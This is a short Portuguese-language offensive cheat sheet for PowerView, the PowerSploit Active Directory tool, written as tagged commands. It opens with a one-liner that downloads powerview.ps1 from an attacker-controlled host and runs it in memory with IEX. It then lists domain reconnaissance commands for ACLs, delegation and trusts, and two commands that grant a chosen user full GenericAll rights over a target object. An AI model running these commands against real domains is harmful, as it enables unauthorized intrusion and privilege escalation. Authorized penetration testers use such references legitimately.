# powerview

% ad, windows, powerview

## carrega a partir de um local remoto
#plateform/windows #target/remote  #cat/RECON 

https://github.com/PowerShellMafia/PowerSploit/

```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/powerview.ps1') | IEX
```

## Obter usuário pelo SID
#plateform/windows #target/remote  #cat/RECON 
```powershell
ConvertFrom-SID <sid>
```

## Identificar ACL do usuário 
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-ObjectAcl -Identity <user> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

## Identificar ACL de todos os usuários do domínio
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Adicionar DACL de usuário.
#plateform/windows #target/remote  #cat/ATTACK
```powershell
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <current_user> -Rights All
```

## Identifica todos os grupos que o usuário atual obteve acesso
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Identifica todos os usuários que o usuário atual obteve acesso
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Adicione a permissão GenericAll para um usuario alvo
#plateform/windows #target/remote  #cat/ATTACK/EXPLOIT 
```powerview
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <user> -Rights All
```

## Obter todos computadores com delegação irrestrita
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainComputer -Unconstrained
```

## Obter todas as relações de confiança do domínio
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainTrustMapping
```

## Obter membro do grupo
## Get group member
```powershell
Get-DomainGroupMember -Identity "<group|Administrators>" -Domain <domain>
```

